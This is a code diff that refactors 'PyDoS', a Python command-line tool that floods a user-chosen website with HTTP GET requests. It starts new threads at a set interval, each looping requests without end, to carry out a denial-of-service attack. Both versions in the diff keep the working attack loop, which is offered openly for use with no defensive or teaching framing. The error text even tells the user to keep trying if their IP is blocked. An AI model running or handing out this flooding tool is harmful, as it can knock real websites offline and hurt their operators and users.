@@ -1,128 +1,147 @@
-import threading
-import requests
-import time
-from datetime import date , datetime
-import os.path
+from datetime import datetime
 from os import system
+from os.path import exists
+from threading import Thread
+from time import sleep
+from typing import Final
 
-os.system("") #init color
+from requests import get, RequestException, Response
+from requests.exceptions import InvalidURL
 
-current_date=datetime.now().date()
-current_datetime=datetime.now()
+from enum import Enum
 
-try:
-    from components.logo import logo
-    from components.components import commands , settings , col
-    print(col.PURPLE+logo)
-except ImportError as err:
-    print(col.RED+'[!]',col.YELLOW+"Failed import modules: >>>", err)
+
+class Color(Enum):
+    """
+    An enumeration of color codes for formatting text output.
+
+    Attributes:
+    - PURPLE: The color code for purple.
+    - GREEN: The color code for green.
+    - CYAN: The color code for cyan.
+    - RED: The color code for red.
+    - YELLOW: The color code for yellow.
+    - STOP: The color code to reset the text color.
+    """
+    PURPLE: str = '\033[35m'
+    GREEN: str = '\033[32m'
+    CYAN: str = '\033[96m'
+    RED: str = '\033[31m'
+    YELLOW: str = '\033[33m'
+    STOP: str = '\033[0m'
+
+
+# CONSTANTS
+logo: Final[str] = """
+██████╗░██╗░░░██╗██████╗░░█████╗░░██████╗
+██╔══██╗╚██╗░██╔╝██╔══██╗██╔══██╗██╔════╝
+██████╔╝░╚████╔╝░██║░░██║██║░░██║╚█████╗░
+██╔═══╝░░░╚██╔╝░░██║░░██║██║░░██║░╚═══██╗
+██║░░░░░░░░██║░░░██████╔╝╚█████╔╝██████╔╝
+╚═╝░░░░░░░░╚═╝░░░╚═════╝░░╚════╝░╚═════╝░
+"""
+
+commands: Final[str] = '''
+Usage:
+    --DoS:  Denial-of-Service 
+    --help:  print this menu
+    --settings:  open settings menu
+'''
+
+settings: Final[str] = '''
+Usage:
+    def_time: sets default time sleep
+    exit: exit from the settings menu
+'''
+
+system("")  # init colors
+
+current_date = datetime.now().date()
+current_datetime = datetime.now()
+
+print(f"{Color.PURPLE}{logo}")
 
 print(commands)
 
+
+def dos():
+    """
+    Executes a continuous loop that tries to make a GET request to a given site.
+    """
+    global site
+    while True:
+        try:
+            get(site)
+        except RequestException:
+            print(f"{Color.RED}PRESS Ctrl+V to out Request Error, object closed or your IP blocked, trying to connect...")
+            print(Color.STOP)
+
+
 while True:
-    setup=input(col.PURPLE+'Enter command:>>>')
-    
-    if setup=='--DoS' or setup.startswith('http'):
-        check_file=os.path.exists("components/settings/deftime.txt")
-        try:
-            r = requests.get("https://www.google.com/")
-            print(col.GREEN+'Internet Connection OK!')
-        except:
-            print(col.WARN+'[!]',col.WARN+"Connection Error!")
-            continue
-        
-        if setup.startswith('http'):
-            site=setup
-            while True:
-                try:
-                    r = requests.get(site)
-                    print(col.GREEN+'Connection to:',site,',OK!')
-                    break
-                except:
-                    print(col.RED+'[!]',col.YELLOW+"Invalid URL!")
-                    site = input(col.PURPLE+'Enter object URL: >>>')
-        
-        else:
-            while True:
-                site = input(col.PURPLE+'Enter object URL: >>>')
-                try:
-                    r = requests.get(site)
-                    print(col.GREEN+'Connection to:',site,',OK!')
-                    break
-                except:
-                    print(col.RED+'[!]',col.YELLOW+"Invalid URL!")
-                    continue
-              
-        print(col.PURPLE)
-        while True:
-            if check_file:
-                deffile=open("components/settings/deftime.txt")
-                deftime=deffile.read()
-                fg=input(col.PURPLE+"Do you want to use setted time sleep? (n/y):>>>")
-                if fg=="y":
-                    sleep=float(deftime)
-                    print(col.PURPLE+f"Setted time: {sleep}")
-                    deffile.close()
-                    break
-                else:
-                    pass
+    match input(f"{Color.PURPLE}Enter command: >>> "):
+        case '--DoS':
             try:
-                sleep = float(input(col.PURPLE+'Enter time sleep: >>>'))
-                break
-            except:
-                print(col.RED+'[!]',col.YELLOW+'Please ,Enter floatable number !')
-                
-        print(col.STOP)
-        def dos():
+                r: Response = get("https://www.google.com/")
+                print(f"{Color.GREEN}Internet Connection is OK!")
+            except RequestException:
+                print(f"{Color.RED}[!]{Color.YELLOW}Connection Error!")
+                continue
+
+            while True:
+                site: str = input(f"{Color.PURPLE}Enter site URL: >>>")
+                try:
+                    r: Response = get(site)
+                    print(f"{Color.GREEN}Connection to {site} is OK!")
+                    break
+                except InvalidURL:
+                    print(f"{Color.RED}[!]{Color.YELLOW} Invalid URL!")
+
+            print(Color.PURPLE)
             while True:
                 try:
-                    requests.get(site)
-                except Exception as e:
-                        print(col.RED+'PRESS Ctrl+V to out Request Error , object cloused or your IP blocked, trying to connect...')
-                        print(col.STOP)
+                    if exists("components/settings/deftime.txt"):
+                        with open("components/settings/deftime.txt") as f:
+                            sleep_time: str | float = f.read()
+                        if input(f"{Color.PURPLE}Do you want to use set time sleep? (n/y): >>>") == "y":
+                            sleep_time = float(sleep_time)
+                            print(f"{Color.PURPLE}Set time: {sleep_time}")
+                            break
 
-        print(col.GREEN +'DoS successfully started to:', site)
-        print(col.STOP)
-        while True:
-            time.sleep(sleep)
-            threading.Thread(target=dos).start()
-            
-    if setup=='--help':
-        try:
+                    sleep_time = float(input(f"{Color.PURPLE}Enter time sleep: >>>"))
+                    break
+                except ValueError:
+                    print(f"{Color.RED}[!]{Color.YELLOW} Please, enter floatable number!")
+
+            print(Color.STOP)
+            print(f"{Color.GREEN}DoS successfully started to {site}")
+            print(Color.STOP)
+            while True:
+                sleep(sleep_time)
+                Thread(target=dos).start()
+
+        case '--help':
             print(commands)
-        except:
-            print(col.RED+'[!]',col.YELLOW+"Error , module 'commands' is a unavaible")
-        continue #Они нужны
 
-    if setup=='--settings':
-        print("This is a settings")
-        try:
+        case '--settings':
+            print("This is a settings")
             print(settings)
-        except:
-            print(col.RED+'[!]',col.YELLOW+"Critical Error , module 'settings' is a unavaible , can't print settings help")
-        while True:
-            setting1=input(col.PURPLE+'Enter settings:>>>')
-            if setting1.startswith("def"):
-                while True:
-                    try:
-                        sleep1 = input(col.PURPLE+'(to out type exit)Enter default time sleep: >>>')
-                        if sleep1.startswith("ex"):
-                            break
-                        else:
-                            file=open("components/settings/deftime.txt","w")
-                            file.write(sleep1)
-                            print(col.GREEN+'[!]',f"Succesufully writed default time sleep, time:{sleep1}")
-                            file.close()
-                            break
-                    except Exception as e:
-                        print(col.RED+'[!]',col.YELLOW+f'Error:{e}')
-                        break
-                    
-            if setting1.startswith("ex"):
-                print("Exiting from settings!")
-                break
-            
-        continue
+            while True:
+                match input(f"{Color.PURPLE}Enter setting: >>>"):
+                    case "def_time":
+                        try:
+                            sleep_time = input(f"{Color.PURPLE}Enter default time sleep: >>>")
+                            if sleep_time.startswith("ex"):
+                                continue
+                            with open("components/settings/deftime.txt", "w") as f:
+                                f.write(sleep_time)
+                            print(f"{Color.GREEN}[!] Successfully wrote default time sleep ({sleep_time})")
+                        except Exception as e:
+                            print(f"{Color.RED}[!]{Color.YELLOW} Error: {e}")
+                            continue
 
-    else:
-        print(col.RED+'[!]',col.YELLOW+'Error , undefined command')
+                    case "exit":
+                        print("Exiting from settings!")
+                        break
+
+        case _:
+            print(f"{Color.RED}[!]{Color.YELLOW} Error: undefined command!")
